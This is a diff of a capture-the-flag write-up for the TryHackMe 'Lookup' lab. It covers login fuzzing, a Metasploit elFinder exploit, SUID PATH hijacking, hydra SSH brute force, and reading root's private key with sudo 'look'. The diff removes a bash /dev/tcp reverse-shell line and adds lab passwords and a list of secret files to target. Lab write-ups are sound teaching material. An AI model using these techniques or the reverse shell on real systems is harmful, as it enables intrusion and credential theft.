@@ -69,9 +69,9 @@ ffuf -u http://lookup.thm/login.php \
 
 One username stood out as behaving differently (different response length / different failure message). In this case, `admin` was a valid username.
 
-From there I tried password fuzzing for the known-valid user. A single password candidate produced a noticeably different response compared to the rest (a strong hint that it’s relevant), but `admin:<candidate>` still did not log in.
+From there I tried password fuzzing for the known-valid user. However `admin:<candidate>` did not log yield results.
 
-Instead of stopping there, I re-ran username fuzzing while keeping that candidate password fixed. That revealed a second username that actually authenticated successfully:
+I re-ran username fuzzing with shorter & simpler namelist (mainly because I was connected to my phones hotspot that couldn't handle larger lists efficiently). That revealed a second username that actually authenticated successfully with password from `rockyou.txt`:
 
 - `jose` / `password123`
 
@@ -100,13 +100,8 @@ High-level approach:
 3. Trigger an image action (rotate/resize) so the backend executes the injected filename.
 4. Hit the newly written PHP file with a query parameter to run commands, then pop a reverse shell.
 
-Once code execution is working, I switched to a reverse shell.
+Luckily this exploit already exists in metasploit as `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`, so not much of technical hocuspocus here. Just load the exploit, choose the payload, set the target and launch the cannon and boom - you have a shell as `www-data`. Normal script kiddie activities.
 
-Example reverse shell payload:
-
-```text
-bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'
-```
 
 ### Horizontal Privilege Escalation (SUID `pwm` + PATH Injection)
 
@@ -114,9 +109,11 @@ From the `www-data` shell, I found a SUID binary:
 
 - `/usr/sbin/pwm`
 
-It invokes common utilities (like `id`) and attempts to read a `.passwords` file but looks in the wrong place. By placing a fake `id` earlier in `PATH`, I could influence what `pwm` sees and coax it into revealing the password list.
+The binary invokes common utilities like `id` and attempts to read a `.passwords` file, but it looks in the wrong place. This opens the door for **PATH hijacking**. By placing a fake `id` earlier in `PATH`, we can control what `pwm` sees and influence its logic.
 
-In practice, the trick is that `pwm` appears to call `id` without an absolute path and then makes decisions based on its output. By writing our own `id` script into `/tmp` and prepending `/tmp` to `PATH`, `pwm` will execute our script, which prints an `id`-style line containing `(think)`.
+The key detail is that `pwm` calls `id` **without an absolute path** and makes decisions based on its output. By dropping a custom `id` script into `/tmp` and prepending `/tmp` to `PATH`, `pwm` executes our script instead of the real binary. The script simply prints an `id`-style line containing `(think)`, convincing the program it’s running as the `think` user.
+
+In simpler terms, we trick the custom binary into believing it was executed by another user. It then runs its normal functionality and reads the password file in `think`’s home directory. Normally we can’t just walz in there with restricted user, such as `www-data`, but by abusing the program’s logic we get it to print the passwords for us.
 
 Highlights: SUID bit file pwn
 
@@ -128,7 +125,7 @@ export PATH=/tmp:$PATH
 /usr/sbin/pwm
 ```
 
-After that, I collected the leaked passwords into a wordlist and brute-forced SSH for the `think` user.
+As suspected, it leaked password list. I collected the leaked passwords into a wordlist and brute-forced SSH for the `think` user.
 
 Example:
 
@@ -136,13 +133,36 @@ Example:
 hydra -l think -P passwords.txt ssh://lookup.thm
 ```
 
+- **Password of think:** `josemario.AKA(think)`
+
 ### Root (Sudo `look` via GTFOBins)
 
 As `think`, `sudo -l` shows a passwordless rule allowing `look` as root.
 
-Because `look` can read arbitrary files (GTFOBins), I used it to dump root-only files.
+Because `look` can read arbitrary files (GTFOBins), I used it to dump root-only files. My initial intuition was to read `/etc/shadow` to obtain hashes, but that action was blocked.
 
-Highlights: Sudo `look` to extract SSH private key
+Luckily reading /etc/shadow is not the only way to obtain root's pass. Examples of possible paths:
+
+Vertical vectors (escalate to root):
+- `/root/.ssh/id_rsa` -> private key for direct root SSH login
+- `/root/.ssh/authorized_keys` -> inject your own key if write is available
+- `/var/backups/shadow.bak`, `passwd.bak` -> backup hashes to crack offline
+- `/proc/1/environ`, `/proc/1/cmdline` -> secrets from root-owned init process
+- `/root/.bashrc`, `/root/.profile` -> credential env vars loaded on root login
+- `/var/spool/cron/crontabs/root` -> reveals scripts executed as root
+- `/etc/sudoers`, `/etc/sudoers.d/*` -> misconfigurations granting unintended root access
+
+If vertical privilege escalation vectors don't yield results, you should enumerate for potentially interesting horizontal targets that can ultimately provide the path to root.
+
+Horizontal vectors (pivot to another user):
+- `/etc/passwd` -> enumerate valid users to target
+- `/root/.bash_history` -> commands revealing interactions with other accounts
+- `/root/.netrc` -> FTP/HTTP credentials belonging to other users
+- `/root/.my.cnf`, `/root/.pgpass` -> DB credentials reused across accounts
+- `/opt/*/config*`, `/var/www/*/config*` -> app credentials for service accounts
+- `sudo -l` reveals `(bob) NOPASSWD:` style entries -> pivot directly into another user's shell
+
+I didn't have to resort to moving horizontally, sudo `look` allowed me to extract SSH private key:
 
 ```bash
 LFILE=/root/.ssh/id_rsa
